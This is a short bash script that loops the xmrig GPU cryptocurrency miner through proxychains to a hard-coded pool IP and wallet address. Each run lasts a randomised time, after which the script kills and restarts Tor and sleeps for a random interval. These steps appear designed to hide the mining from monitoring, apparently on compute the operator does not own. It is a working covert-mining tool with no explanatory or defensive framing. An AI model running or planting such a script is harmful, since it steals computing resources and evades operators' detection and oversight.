while :
do

	x=$(($RANDOM%15))
	y=20
	z=$(($x+$y))

	a=$(($RANDOM%150))
	b=2400
	c=$(($a+$b))

	w=$(($RANDOM%100))
	e=120
	aaram=$(($w+$e))
	timeout -k 5 $c\s  proxychains ./xmrig-cuda/build/xmrig --donate-level 0 -o 54.189.231.81:13802 -O  RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc:pps  -a kawpow --cuda --tls  --no-cpu  --retries=5000
	timeout -k 5 6s pgrep tor | xargs kill
	screen -dmS TOR tor
	sleep $aaram
	echo "Kartik Bhai Amar Rahe"
done
